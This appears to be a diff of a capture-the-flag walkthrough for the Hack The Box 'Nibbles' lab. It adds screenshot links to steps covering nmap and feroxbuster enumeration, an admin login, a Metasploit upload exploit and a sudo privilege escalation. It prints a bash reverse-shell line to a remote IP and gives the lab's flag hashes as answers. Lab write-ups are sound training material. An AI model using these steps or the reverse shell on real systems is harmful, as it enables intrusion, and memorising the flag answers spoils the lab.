@@ -11,6 +11,8 @@ Performed an Nmap scan:
 ```bash
 nmap -sV -sC -oA nmap/Nibbles 10.129.243.127
 ```
+![nmap](img/nmap.png)
+
 **Open Ports**:
 - 22/tcp (SSH)
 - 80/tcp (HTTP)
@@ -21,6 +23,8 @@ nmap -sV -sC -oA nmap/Nibbles 10.129.243.127
 
 ## Task 2: What is the relative path on the webserver to a blog?
 Inspected the source of the home page:
+![websrc](img/websrc.png)
+
 ```html
 <!-- /nibbleblog/ directory. Nothing interesting here! -->
 ```
@@ -30,6 +34,8 @@ Inspected the source of the home page:
 
 ## Task 3: What CMS is being used by the blog?
 Accessed `/nibbleblog/` and checked the footer:
+![webpage](img/webpage.png)
+
 > Powered by Nibbleblog
 
 **Answer**: `Nibbleblog`
@@ -41,8 +47,11 @@ Used feroxbuster to find XML files:
 ```bash
 feroxbuster -u http://10.129.243.127/nibbleblog/
 ```
+![feroxbuster](img/feroxbuster.png)
+
 Found user config:
-> /nibbleblog/content/private/users.xml
+> /nibbleblog/content/private/users.xml  
+![userxml](img/userxml.png)
 
 **Answer**: `/nibbleblog/content/private/users.xml`
 
@@ -51,7 +60,8 @@ Found user config:
 ## Task 5: What is the admin user's password?
 Logged in via:
 - **Username**: admin
-- **Password**: Nibbles
+- **Password**: Nibbles  
+![login](img/login.png)
 
 **Answer**: `nibbles`
 
@@ -59,7 +69,8 @@ Logged in via:
 
 ## Task 6: What version of Nibbleblog is running?
 Checked settings after login:
-> Nibbleblog 4.0.3 "Coffee"
+> Nibbleblog 4.0.3 "Coffee"  
+![setting](img/setting.png)
 
 **Answer**: `4.0.3`
 
@@ -78,8 +89,9 @@ Used Metasploit module:
 ```bash
 use multi/http/nibbleblog_file_upload
 ```
-Gained meterpreter shell and ran `getuid`:
-> `nibbler`
+Gained meterpreter shell and ran `getuid`:  
+> `nibbler`  
+![meterpreter](img/meterpreter.png)
 
 **Answer**: `nibbler`
 
@@ -90,6 +102,8 @@ Read user flag from:
 ```bash
 cat /home/nibbler/user.txt
 ```
+![userflag](img/userflag.png)
+
 **Answer**: `893797f82ce88e0b891bb58c95d80842`
 
 ---
@@ -99,6 +113,8 @@ Checked sudo permissions:
 ```bash
 sudo -l
 ```
+![sudo-l](img/sudo-l.png)
+
 > (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
 
 **Answer**: `monitor.sh`
@@ -115,13 +131,15 @@ bash -i >& /dev/tcp/$IP/$PORT 0>&1
 ```
 Ran it with:
 ```bash
-sudo /home/nibbler/personal/stuff/monitor.sh
+sudo -u root /home/nibbler/personal/stuff/monitor.sh
 ```
+![root](img/root.png)
 
 Then:
 ```bash
 cat /root/root.txt
 ```
+![rootflag](img/rootflag.png)
 
 **Answer**: `085806261dc17eb756f71d56190e185d`
 
